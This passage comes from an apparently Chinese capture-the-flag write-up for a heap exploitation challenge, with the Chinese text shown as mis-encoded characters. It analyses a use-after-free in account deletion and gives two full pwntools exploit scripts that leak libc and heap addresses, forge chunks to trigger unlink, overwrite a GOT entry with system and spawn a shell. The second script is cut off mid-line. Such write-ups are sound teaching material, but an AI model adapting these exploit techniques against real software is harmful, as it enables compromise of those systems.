class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  __int64 unknown1;</span><br><span class="line">  __int64 unknown2;</span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">8</span>];</span><br><span class="line">  <span class="keyword">char</span> password[<span class="number">8</span>];</span><br><span class="line">  __int64 used_tag;</span><br><span class="line">  <span class="keyword">char</span> desc[<span class="number">88</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  __int64 is_admin;</span><br><span class="line">  __int64 account_id;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user</span> *<span class="title">user_data</span>;</span></span><br><span class="line">  __int64 money;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¯¹<code>account</code>å¯ä»¥è¿›è¡Œæ³¨å†Œï¼Œåˆ é™¤ï¼Œä¿®æ”¹å¯†ç è¿™3ä¸ªæ“ä½œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- æ³¨å†Œï¼šmalloc(0x80)</span><br><span class="line">- åˆ é™¤ï¼šfree(0x80)ï¼Œæ²¡æœ‰æ¸…ç©ºuser_listå†…å®¹</span><br><span class="line">- ä¿®æ”¹å¯†ç ï¼šä¿®æ”¹user_dataçš„passwordå­—æ®µï¼Œ8å­—èŠ‚</span><br></pre></td></tr></table></figure><p>å­˜åœ¨ä¸€ä¸ªæ˜æ˜¾çš„<code>UAF</code>ï¼Œå¦‚æœèƒ½æ§åˆ¶<code>user_data</code>ï¼Œå°±èƒ½ä»»æ„åœ°å€å†™ã€‚</p><p>ç•™æ„<code>delete_account</code>ä¸€ä¸ªå‘ç‚¹ï¼Œuseråˆ é™¤ä¹‹åï¼Œè™½ç„¶ä¸ä¼šæ¸…ç©º<code>user_data</code>æŒ‡é’ˆï¼Œä½†æ˜¯æŒ‡é’ˆ<code>-16</code>äº†ï¼Œæœ¬æ¥åˆ›å»ºä¸€ä¸ª<code>0x20</code>å¤§å°çš„chunkåï¼Œåˆ©ç”¨UAFå¯ä»¥å¾ˆè½»æ˜“åœ°ä¿®æ”¹<code>chunk size</code>,ç°åœ¨éœ€è¦å°†ä¸¤ä¸ª<code>0x90</code>çš„chunkæ‹¼èµ·æ¥å†paddingä¸€å †<code>0x20</code>å¤§å°çš„chunkæ‰èƒ½ä¿®æ”¹<code>chunk size</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( is_admin[<span class="number">4</span> * v3] == <span class="number">3</span> )</span><br><span class="line">&#123;</span><br><span class="line">  is_admin[<span class="number">4</span> * v3] = <span class="number">0L</span>L;</span><br><span class="line">  user_data[<span class="number">4</span> * v3]-&gt;used_tag = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"The account(%s) deleted success .\n"</span>, user_data[<span class="number">4</span> * v3]-&gt;name);</span><br><span class="line">  <span class="built_in">memset</span>(user_data[<span class="number">4</span> * v3], <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="built_in">free</span>(user_data[<span class="number">4</span> * v3]);</span><br><span class="line">  user_data[<span class="number">4</span> * v3] = (struct user *)((<span class="keyword">char</span> *)user_data[<span class="number">4</span> * v3] - <span class="number">16</span>); <span class="comment">// è¿™é‡Œæ˜¯å‘</span></span><br></pre></td></tr></table></figure><h3 id="expç¼–å†™"><a href="#expç¼–å†™" class="headerlink" title="expç¼–å†™"></a>expç¼–å†™</h3><h4 id="è§£é¢˜æ–¹æ³•ä¸€"><a href="#è§£é¢˜æ–¹æ³•ä¸€" class="headerlink" title="è§£é¢˜æ–¹æ³•ä¸€"></a>è§£é¢˜æ–¹æ³•ä¸€</h4><p>é¦–å…ˆéœ€è¦æ³„éœ²åœ°å€ï¼Œæ–¹æ³•å¾ˆç®€å•</p><ol><li>åˆ›å»ºä¸€ä¸ªæ–°è´¦å·ï¼ˆchunkæ˜¯ä¸€ä¸ª<code>unsorted bins</code>ï¼‰</li><li>åˆ©ç”¨<code>add_to_list</code>åˆ›å»ºä¸€ä¸ªæ–°list</li><li>åˆ æ‰è¿™ä¸ªè´¦å·</li><li>æ­¤æ—¶åˆ©ç”¨<code>add_to_list</code>åˆ›å»ºä¸€ä¸ªæ–°listå°±å¯ä»¥åˆ©æ—§åˆšåˆšfreeçš„userçš„chunkï¼Œ<code>unsorted bins</code>çš„<code>fd</code>å°±èƒ½æ³„éœ²å‡ºæ¥</li></ol><p>gets hellæ–¹æ³•æ˜¯ï¼šä½¿ç”¨<code>unlink</code>æ§åˆ¶<code>user_data</code>æŒ‡é’ˆï¼Œç„¶ååŠ«æŒgotè¡¨ï¼Œå…³é”®æ—¶å¦‚ä½•æ„é€ <code>fake chunk</code></p><p>è¿™é¢˜ç›®ï¼Œå¯æ§åˆ¶çš„è¾“å…¥ç‚¹åªæœ‰å‡ ä¸ªï¼š</p><ol><li>åˆ›å»ºè´¦å·æ—¶è¾“å…¥çš„<code>name</code>ï¼Œ<code>password</code>ï¼Œ<code>profile</code>ï¼Œç„¶è€Œåˆ é™¤çš„æ—¶å€™å†…å­˜ä¼šæ¸…ç©ºï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨</li><li>ä¸‹orderæ—¶è¾“å…¥çš„<code>desc</code>ï¼Œè¿™ä¸ªæ¯”è¾ƒå¥½ç”¨é•¿åº¦æœ‰<code>0x7c</code></li><li>è´­ä¹°cakeåè¾“å…¥çš„<code>desc</code>ï¼Œè¿™ä¸ªè¾“å…¥é•¿åº¦æœ‰<code>0x4b0</code>ï¼Œä¹Ÿå¾ˆå¥½ç”¨</li></ol><p>æ„é€ å…³é”®ç‚¹ï¼š</p><ol><li>ç”±äºä¸Šé¢æåˆ°<code>delete_account</code>çš„å‘ï¼Œéœ€è¦å°†ä¸¤ä¸ª<code>0x90</code>çš„chunkï¼Œè¿åœ¨ä¸€èµ·ä½¿ç”¨ï¼Œæ‰èƒ½ä¿®æ”¹<code>Chunk size</code></li><li>ç¨‹åºæ²¡æœ‰<code>double free</code>å’Œå †æº¢å‡ºï¼Œéœ€è¦ä½¿<code>allocated chunk</code>å’Œ<code>free chunk</code>é‡å </li></ol><p>æ„é€ æ­¥éª¤å¦‚ä¸‹ï¼š</p><ul><li>åˆ›å»ºä¸€ä¸ªæ–°è´¦å·  <code>chunk 0x90</code></li><li>åˆ›å»ºä¸€ä¸ªæ–°list0 <code>chunk 0x20</code></li><li>åˆ›å»ºä¸€ä¸ªæ–°order0 <code>chunk 0x20 chunk 0x90</code> ï¼ˆä¼šåˆ é™¤list0 <code>free 0x20</code>ï¼‰</li><li>åˆ›å»ºä¸€ä¸ªæ–°è´¦å·  <code>chunk 0x90</code></li><li>åˆ›å»ºä¸¤ä¸ªæ–°list0ï¼Œlist1 <code>chunk 0x20</code> <code>chunk 0x20</code></li><li>åˆ é™¤list0 <code>free 0x20</code></li><li>åˆ é™¤user2 <code>free 0x90</code></li><li>åˆ›å»ºä¸€ä¸ªæ–°order1 <code>chunk 0x20 chunk 0x90</code>ï¼ˆä¼šåˆ é™¤list1 <code>free 0x20</code>ï¼‰</li><li>åˆ›å»ºä¸¤ä¸ªæ–°list0ï¼Œlist1 <code>chunk 0x20</code> <code>chunk 0x20</code></li><li>åˆ é™¤user3 <code>free 0x90</code></li><li>è´­ä¹°order0 <code>free 0x90 free 0x20 chunk 0x4c0</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">allocated 0x90 #user2 =&gt; order1[desc]</span><br><span class="line">allocated 0x20 #list0 =&gt; list0 =&gt; order1</span><br><span class="line">freed     0x20 #order0</span><br><span class="line">freed     0x90 #order0[desc]</span><br><span class="line">freed     0x90 #user3</span><br><span class="line">allocated 0x20 #list1 =&gt; list0</span><br><span class="line">allocated 0x20 #list1 =&gt; list1</span><br><span class="line">allocated 0x4c0#desc0</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œ3ä¸ª<code>freed chunk</code>ä¼šåˆå¹¶ä¸€èµ·ä¸ºä¸€ä¸ª<code>unsorted bins</code>ï¼Œç»§ç»­åˆ›å»ºæ–°list2-8ã€‚è¿™æ—¶å€™ï¼Œå‘ç°ä¿®æ”¹<code>user3</code>çš„<code>password</code>ï¼Œå¯ä»¥ä¿®æ”¹<code>list8</code>çš„<code>size</code>ï¼Œå¦‚æœæŠŠ<code>size</code>ä¿®æ”¹ä¸º<code>0x581</code>(0x4c0+0x20+0x20+0x80)ï¼Œé‚£ä¹ˆåˆ é™¤<code>list8</code>ï¼Œå°±èƒ½æŠŠä¸‹é¢ä¸€æ•´ç‰‡çš„å†…å­˜éƒ½freeæ‰ï¼Œ<code>top chunk</code>è¢«æŠ¬é«˜ã€‚</p><p>ç»§ç»­åˆ æ‰list4-7ï¼Œç„¶åä¸‹orderæ—¶ï¼Œä¼šåˆ›å»º<code>desc</code>ï¼Œä¼šä»<code>top chunk</code>å¤„å¼€å§‹åˆ†é…å†…å­˜ï¼Œè¿™ä¸ª<code>chunk</code>çš„æœ€å16å­—èŠ‚ï¼Œåˆšå¥½è¦†ç›–åˆ°<code>list0</code>çš„<code>chunk head</code>ï¼Œç»è¿‡ç²¾å¿ƒæ„é€ ï¼Œåˆ é™¤<code>list0</code>çš„æ—¶å€™å°±å¯ä»¥è§¦å‘<code>unlink</code>ã€‚</p><p>è§‚å¯Ÿä¸€ä¸‹å½“å‰heapçš„ç»“æ„ï¼Œ<code>list0</code>å‰é¢å¯æ§çš„<code>chunk</code>æœ‰<code>order1[desc]</code>ï¼Œå¯ä»¥åœ¨è¿™é‡Œæ„é€ <code>fake chunk</code>ï¼Œ<code>p64(&amp;p-0x18)+p64(&amp;p-0x10)</code>ã€‚å°†<code>list0</code>çš„<code>chunk head</code>æ”¹ä¸º<code>p64(0x1f0)+p64(90)</code>ï¼ŒåŒæ—¶ä¸‹ä¸€å—<code>chunk</code>éœ€è¦è¡¥ä¸¤ä¸ª<code>allocated chunk</code>ï¼Œå¯ä»¥åœ¨<code>desc0</code>ä¸­é¢„ç•™ã€‚</p><p>å®Œæ•´expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(newID=<span class="string">''</span>,newPWD=<span class="string">''</span>,newDESC=<span class="string">''</span>,reg=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> reg:</span><br><span class="line">        p.sendafter(<span class="string">'&gt; '</span>,<span class="string">'12345'</span>)</span><br><span class="line">        p.sendafter(<span class="string">'&gt; '</span>,<span class="string">'12345'</span>)</span><br><span class="line">        p.sendafter(<span class="string">'Register Your User?\n'</span>,<span class="string">'0'</span>)</span><br><span class="line">        p.sendafter(<span class="string">'Enter your New ID.\n'</span>,newID)</span><br><span class="line">        p.sendafter(<span class="string">'Enter your New Password.\n'</span>,newPWD)</span><br><span class="line">        p.sendafter(<span class="string">'Enter your profile.\n'</span>,newDESC)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">'&gt; '</span>,<span class="string">'Admin'</span>)</span><br><span class="line">        p.sendafter(<span class="string">'&gt; '</span>,<span class="string">'admin'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'9'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'sign out?\n'</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">order_menu</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'4'</span>) <span class="comment"># enter order menu</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit_order_menu</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'5'</span>) <span class="comment"># exit order menu</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_to_list</span><span class="params">(code)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'&gt;'</span>,str(code))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">order_cake</span><span class="params">(price,desc)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'4'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'0) Yes, 1) No\n'</span>,<span class="string">'0'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(desc)):</span><br><span class="line">        p.sendafter(<span class="string">'Enter the price'</span>,str(price[i]))</span><br><span class="line">        p.sendafter(<span class="string">'Enter a description'</span>,desc[i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cancel_list</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'\n'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">account_menu</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit_account_menu</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_accont</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'delete\n'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_password</span><span class="params">(idx,pwd)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendafter(<span class="string">' change PW\n'</span>,str(idx))</span><br><span class="line">    p.sendafter(<span class="string">'New Password.\n'</span>,pwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_cake</span><span class="params">(code,number,desc)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'be purchased.\n'</span>,str(code))</span><br><span class="line">    p.sendafter(<span class="string">'to purchase.\n'</span>,str(number))</span><br><span class="line">    p.sendafter(<span class="string">'comment for cake.\n'</span>,desc)</span><br><span class="line"></span><br><span class="line">login(<span class="string">'aaaa'</span>,<span class="string">'aaaa'</span>,<span class="string">'aaaa'</span>,reg=<span class="number">1</span>)</span><br><span class="line">login()</span><br><span class="line">order_menu()</span><br><span class="line">add_to_list(<span class="number">0</span>) <span class="comment">#0 </span></span><br><span class="line">order_cake([<span class="number">1</span>],[<span class="string">'1111'</span>])</span><br><span class="line">exit_order_menu()</span><br><span class="line">logout()</span><br><span class="line">login(<span class="string">'bbbb'</span>,<span class="string">'bbbb'</span>,<span class="string">'bbbb'</span>,reg=<span class="number">1</span>)</span><br><span class="line">login()</span><br><span class="line">order_menu()</span><br><span class="line">add_to_list(<span class="number">1</span>) <span class="comment">#0</span></span><br><span class="line">add_to_list(<span class="number">2</span>) <span class="comment">#1</span></span><br><span class="line">cancel_list(<span class="number">0</span>)</span><br><span class="line">exit_order_menu()</span><br><span class="line"><span class="comment"># delete account 'aaaa' -&gt; unsorted bins</span></span><br><span class="line">account_menu()</span><br><span class="line">delete_accont(<span class="number">2</span>)</span><br><span class="line">exit_account_menu()</span><br><span class="line"><span class="comment"># leak libc address</span></span><br><span class="line">order_menu()</span><br><span class="line">user2_data = <span class="number">0x604210</span></span><br><span class="line">order_cake([<span class="number">0</span>],[p64(user2_data<span class="number">-0x18</span>)+p64(user2_data<span class="number">-0x10</span>)])</span><br><span class="line">add_to_list(<span class="number">1</span>) <span class="comment">#0</span></span><br><span class="line">add_to_list(<span class="number">2</span>) <span class="comment">#2</span></span><br><span class="line">exit_order_menu()</span><br><span class="line">account_menu()</span><br><span class="line">delete_accont(<span class="number">3</span>)</span><br><span class="line">exit_account_menu()</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">8</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">buy_cake(<span class="number">0</span>,<span class="number">10</span>,payload)</span><br><span class="line">order_menu()</span><br><span class="line">add_to_list(<span class="number">3</span>)</span><br><span class="line">libc.address = (u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4b20</span>) &amp; <span class="number">0xfffffffff000</span> </span><br><span class="line">add_to_list(<span class="number">4</span>) <span class="comment">#3</span></span><br><span class="line">add_to_list(<span class="number">5</span>) <span class="comment">#4</span></span><br><span class="line">add_to_list(<span class="number">6</span>) <span class="comment">#5</span></span><br><span class="line">add_to_list(<span class="number">7</span>) <span class="comment">#6</span></span><br><span class="line">add_to_list(<span class="number">8</span>) <span class="comment">#7</span></span><br><span class="line">add_to_list(<span class="number">9</span>) <span class="comment">#8</span></span><br><span class="line">exit_order_menu()</span><br><span class="line">account_menu()</span><br><span class="line"></span><br><span class="line">change_password(<span class="number">3</span>,p64(<span class="number">0x581</span>)) <span class="comment"># overwite list[0] chunk size</span></span><br><span class="line">exit_account_menu()</span><br><span class="line">order_menu()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>,<span class="number">3</span>,<span class="number">-1</span>):</span><br><span class="line">    cancel_list(i)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">14</span>+p64(<span class="number">0x1f0</span>)+p32(<span class="number">0x90</span>)</span><br><span class="line">order_cake([<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],[payload,<span class="string">'1'</span>,<span class="string">'1'</span>])</span><br><span class="line">exit_order_menu()</span><br><span class="line">account_menu()</span><br><span class="line">change_password(<span class="number">2</span>,p64(elf.got[<span class="string">'strlen'</span>]<span class="number">-0x18</span>))</span><br><span class="line">change_password(<span class="number">2</span>,p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">exit_account_menu()</span><br><span class="line">logout()</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="è§£é¢˜æ–¹æ³•äºŒ"><a href="#è§£é¢˜æ–¹æ³•äºŒ" class="headerlink" title="è§£é¢˜æ–¹æ³•äºŒ"></a>è§£é¢˜æ–¹æ³•äºŒ</h4><p>æ³„éœ²åœ°å€æ–¹æ³•ç»™ä¸Šé¢ä¸€æ ·ï¼Œä¸è¿‡è¿™æ¬¡è¿˜éœ€è¦æ³„éœ²heapåœ°å€ï¼Œå¯ä»¥é€šè¿‡æ³„éœ²<code>fastbins</code>çš„<code>fd</code>åœ°å€è®¡ç®—ã€‚ä¸Šé¢æåˆ°UAFä¿®æ”¹<code>chunk size</code>æ¯”è¾ƒéº»çƒ¦ï¼Œä¸è¿‡å¯ä»¥ä¿®æ”¹<code>smallbins</code>çš„<code>bk</code>ã€‚è¿‡ç¨‹å¾ˆå¤æ‚ï¼Œä¸æƒ³å†™äº†ï¼Œå…·ä½“è¿‡ç¨‹åŠ¨æ€è°ƒè¯•çœ‹å§ã€‚</p><p>æ€è·¯æ˜¯æ§åˆ¶<code>smallbins</code>çš„<code>bk</code>ï¼ŒæŒ‡å‘æ„é€ çš„ä¸¤ä¸ªå‡<code>smallbins</code>ï¼Œå‡çš„<code>smallbins</code>å†…å­˜ç©ºé—´ä¸å…¶ä»–å·²ä½¿ç”¨çš„<code>chunk</code>é‡å ï¼Œå¯ä»¥ä¿®æ”¹å…¶ä»–<code>chunk head</code>åˆ¶é€ è§¦å‘<code>unlink</code>çš„æ¡ä»¶ã€‚</p><p>å®Œæ•´EXPï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">login()</span><br><span class="line">order_menu()</span><br><span class="line">add_to_list(<span class="number">0</span>)</span><br><span class="line">add_to_list(<span class="number">1</span>)</span><br><span class="line">order_cake([<span class="number">0</span>,<span class="number">0</span>],[<span class="string">'AAAA'</span>,<span class="string">'BBBB'</span>]) <span class="comment"># 0 1</span></span><br><span class="line">exit_order_menu()</span><br><span class="line"></span><br><span class="line">buy_cake(<span class="number">0</span>,<span class="number">10</span>,<span class="string">'CCCC'</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">order_menu()</span><br><span class="line">add_to_list(<span class="number">0</span>) </span><br><span class="line">libc.address = (u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4b20</span>) &amp; <span class="number">0xfffffffff000</span> </span><br><span class="line">add_to_list(<span class="number">0</span>)</span><br><span class="line">add_to_list(<span class="number">2</span>)</span><br><span class="line">order_cake([<span class="number">0</span>,<span class="number">0</span>],[<span class="string">'DDDD'</span>,<span class="string">'EEEE'</span>]) <span class="comment"># 2 3</span></span><br><span class="line">add_to_list(<span class="number">3</span>)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">0x48</span>)[<span class="number">0x23</span>:<span class="number">0x23</span>+<span class="number">4</span>].strip().ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">order_cake([<span class="number">0</span>],[<span class="string">'FFFF'</span>]) <span class="comment"># 4</span></span><br><span class="line">add_to_list(<span class="number">4</span>)</span><br><span class="line">exit_order_menu()</span><br><span class="line">logout()</span><br><span class="line"></span><br><span class="line">login(<span class="string">'aaaa'</span>,<span class="string">'aaaa'</span>,<span class="string">'aaaa'</span>,reg=<span class="number">1</span>) <span class="comment"># user2</span></span><br><span class="line">login(<span class="string">'bbbb'</span>,<span class="string">'bbbb'</span>,<span class="string">'bbbb'</span>,reg=<span class="number">1</span>) <span class="comment"># user3</span></span><br><span class="line"></span><br><span class="line">login()</span><br><span class="line">buy_cake(<span class="number">0</span>,<span class="number">10</span>,<span class="string">'GGGG'</span>) <span class="comment"># 2 3 4</span></span><br><span class="line"></span><br><span class="line">account_menu()</span><br><span class="line">delete_accont(<span class="number">2</span>)</span><br><span class="line">exit_account_menu()</span><br><span class="line"></span><br><span class="line">order_menu()</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">48</span>+flat(<span class="number">0</span>,<span class="number">0x91</span>,heap_addr+<span class="number">0xe50</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x91</span>,heap_addr+<span class="number">0xdf0</span>,heap_addr+<span class="number">0xe30</span>)</span><br><span class="line">order_cake([<span class="number">0</span>],[payload]) <span class="comment"># 5</span></span><br><span class="line">exit_order_menu()</span><br><span class="line"></span><br><span class="line">buy_cake(<span class="number">3</span>,<span class="number">10</span>,<span class="string">'HHHH'</span>) <span class="comment"># 1 2 4 5</span></span><br><span class="line"></span><br><span class="line">account_menu()</span><br><span class="line">change_password(<span class="number">2</span>,p64(heap_addr+<span class="number">0xe50</span>)) <span class="comment"># overwrite bk</span></span><br><span class="line">exit_account_menu()</span><br><span class="line"></span><br><span class="line">order_menu()</span><br><span class="line">add_to_list(<span class="number">5</span>)</span><br><span class="line">user2_data = <span class="number">0x604210</span></span><br><span class="line">order_cake([<span class="number">0</span>],[p64(user2_data<span class="number">-0x18</span>)+p64(user2_data<span class="number">-0x10</span>)])</span><br><span class="line">exit_order_menu()</span><br><span class="line"></span><br><span class="line">buy_cake(<span class="number">0</span>,<span class="number">20</span>,<span class="string">'IIII'</span>)</span><br><span class="line"></span><br><span class="line">account_menu()</span><br><span class="line">change_password(<span class="number">2</span>,p64(user2_data<span class="number">-0x10</span>)) <span class="comment"># fix bk</span></span><br><span class="line">exit_account_menu()</span><br><span class="line"></span><br><span class="line">order_menu()</span><br><span class="line">add_to_list(<span class="number">6</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x20</span> + p64(<span class="number">0x90</span>) + p64(<span class="number">0x90</span>) <span class="comment"># 5e0</span></span><br><span class="line">order_cake([<span class="number">0</span>],[payload])</span><br><span class="line">exit_order_menu()</span><br><span 